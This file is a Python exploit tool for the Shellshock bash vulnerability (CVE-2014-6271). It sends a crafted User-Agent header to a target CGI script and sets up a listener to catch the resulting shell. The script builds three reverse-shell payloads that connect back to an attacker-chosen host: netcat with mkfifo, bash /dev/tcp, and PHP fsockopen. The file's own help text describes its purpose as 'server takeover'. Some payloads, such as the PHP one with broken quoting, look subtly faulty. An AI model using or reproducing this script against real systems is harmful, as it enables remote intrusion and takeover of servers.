import urllib.parse
import sys
import argparse
from rich import print
import http.client
import time
import socket

RED = "\033[91m"
RESET = "\033[0m"
GREEN = "\033[92m"

def listen(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("[bold green][+][/bold green] [bold yellow1]Listening on port [/bold yellow1]" + str(port))
    conn, addr = s.accept()
    print("[bold green][+][/bold green] [bold yellow1]Connection received from [/bold yellow1]", addr)
    
    while True:
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
    
        if sys.stdout.isatty():
            command = input()
        else:
            command = "default_command"
    
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

print(f"\n")
print("[bold green]░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░░██████╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗[/bold green]")
print("[bold green]██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░██╔════╝██║░░██║██╔══██╗██╔══██╗██║░██╔╝[/bold green]")
print("[bold green]╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░╚█████╗░███████║██║░░██║██║░░╚═╝█████═╝░[/bold green]")
print("[bold green]░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░░╚═══██╗██╔══██║██║░░██║██║░░██╗██╔═██╗░[/bold green]")
print("[bold green]██████╔╝██║░░██║███████╗███████╗███████╗██████╔╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗[/bold green]")
print("[bold green]╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝[/bold green]")
print("\n")

if len(sys.argv) <= 1:
    print("[bold cyan2]Please give some options[/bold cyan2]\n[bold yellow]type [bold green]-h[/bold green] or [bold green]--help[/bold green] for more information[/bold yellow]")
    sys.exit()

def main(args):
    print("[bold green][+][/bold green] [bold yellow1]Attempting to exploit [bold green]CVE-2014-6271[/bold green] on [bold cyan2]%s[/bold cyan2][/bold yellow1]" % args.host)
    a=0
    while a<=5:
        sys.stdout.write(f'\r{RED}Exploiting... |')
        time.sleep(0.1)
        sys.stdout.write('\rExploiting... /')
        time.sleep(0.1)
        sys.stdout.write('\rExploiting... -')
        time.sleep(0.1)
        sys.stdout.write(f'\rExploiting... \\{RESET}')
        time.sleep(0.1)
        a+=1
    sys.stdout.write(f'\r{GREEN}[+] Done!                     {RESET}')
    print("\n[bold green][+][/bold green] [bold yellow1]We will attempt to connect back to [bold cyan2]%s %s[/bold cyan2][/bold yellow1]" % (args.remote, args.port))
    a=0
    while a<=5:
        sys.stdout.write(f'\r{RED}Connecting... |')
        time.sleep(0.1)
        sys.stdout.write('\rConnecting... /')
        time.sleep(0.1)
        sys.stdout.write('\rConnecting... -')
        time.sleep(0.1)
        sys.stdout.write(f'\rConnecting... \\{RESET}')
        time.sleep(0.1)
        a+=1
    sys.stdout.write(f'\r{GREEN}[+] Done!                     {RESET}')
    conn = http.client.HTTPConnection(args.host)

    if args.shell == 'nc':
        rs = "() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" % (args.remote, args.port)
    elif args.shell == 'tcp':
        rs = "() { ignored;};/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (args.remote, args.port)
    elif args.shell == 'php':
        rs = "() { ignored;};/bin/bash -c 'php -r '$sock=fsockopen(%s, %s);exec('/bin/sh -i <&3 >&3 2>&3');'" % (args.remote, args.port)

    print(f"\n[bold green][+][/bold green] [bold yellow1]We will use the following shell: [bold cyan2]" + rs + "[/bold cyan2][/bold yellow1]")

    headers = {"Content-type": "application/x-www-form-urlencoded", "User-Agent": rs}

    conn.request("GET", args.uri, headers=headers)
    port_number = int(args.port)
    listen("0.0.0.0",port_number)

    res = conn.getresponse()
    print(res.status, res.reason)
    data = res.read()
    print(data.decode())

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Efficiently exploit CVE-2014-6271 in susceptible CGI servers for precise server takeover.")
    parser.add_argument("-a", "--host", action='store', default=None, required=True, help="Specify a remote host to test")
    parser.add_argument("-u", "--uri", action='store', default=None, required=True, help="Specify a CGI script to test (e.g., /cgi/test )")
    parser.add_argument("-r", "--remote", action='store', required=True, default=None, help="Specify the host for the reverse shell connection")
    parser.add_argument("-p", "--port", action='store', required=True, default=None, help="Specify the port for the reverse shell connection")
    parser.add_argument("-s", "--shell", action='store', choices=['nc', 'tcp', 'php'], help="Choose your preferred reverse shell method for seamless connectivity (default 'nc')", default='nc', required=False)

    args = parser.parse_args()
    main(args)